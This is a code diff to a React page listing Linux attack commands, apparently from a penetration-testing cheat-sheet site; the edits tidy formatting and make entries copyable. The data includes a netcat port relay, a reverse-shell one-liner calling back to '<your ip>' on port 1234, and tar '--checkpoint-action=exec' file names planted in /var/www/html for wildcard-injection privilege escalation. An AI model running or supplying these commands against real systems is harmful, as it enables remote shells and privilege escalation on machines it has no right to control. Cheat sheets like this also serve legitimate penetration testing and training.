@@ -1,7 +1,8 @@
 import React from 'react';
 import { Typography, Divider } from 'antd';
 import QueueAnim from 'rc-queue-anim';
-const { Title, Paragraph } = Typography;
+
+const { Title, Paragraph, Text } = Typography;
 
 export default function LinuxCommands () {
     const Suid = [
@@ -74,16 +75,16 @@ export default function LinuxCommands () {
     ];
     const PortForwarding = [
         {
-            title: '# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]'
+            title: 'FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]'
         },
         { title: 'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7' },
         {
-            title: '# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]'
+            title: 'ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]'
         },
         { title: 'ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port' },
         { title: 'ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port' },
         {
-            title: '# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe'
+            title: 'mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe'
         },
         {
             title: 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay'
@@ -99,14 +100,13 @@ export default function LinuxCommands () {
     ];
     const wildcardPrivesc = [
         {
-            title: ` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
-        1234 >/tmp/f" > shell.sh`
+            title: `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh`
         },
         {
             title: `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
         },
         {
-            title: ` touch "/var/www/html/--checkpoint=1"`
+            title: `touch "/var/www/html/--checkpoint=1"`
         }
     ];
     return (
@@ -124,8 +124,8 @@ export default function LinuxCommands () {
             >
                 {Suid.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -139,8 +139,8 @@ export default function LinuxCommands () {
             >
                 {VersionSystem.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -154,8 +154,8 @@ export default function LinuxCommands () {
             >
                 {KernelVersion.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -169,8 +169,8 @@ export default function LinuxCommands () {
             >
                 {EnvironmentVariables.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -184,8 +184,8 @@ export default function LinuxCommands () {
             >
                 {ServiceSettings.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -199,8 +199,8 @@ export default function LinuxCommands () {
             >
                 {CronJobs.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -214,8 +214,8 @@ export default function LinuxCommands () {
             >
                 {UsersHost.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -229,8 +229,8 @@ export default function LinuxCommands () {
             >
                 {PortForwarding.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
@@ -244,8 +244,8 @@ export default function LinuxCommands () {
             >
                 {wildcardPrivesc.map( ( k, i ) => {
                     return (
-                        <Paragraph key={i} code editable copyable ellipsis={true}>
-                            {k.title}
+                        <Paragraph key={i}>
+                            <pre><Text copyable>{k.title}</Text></pre>
                         </Paragraph>
                     );
                 } )}
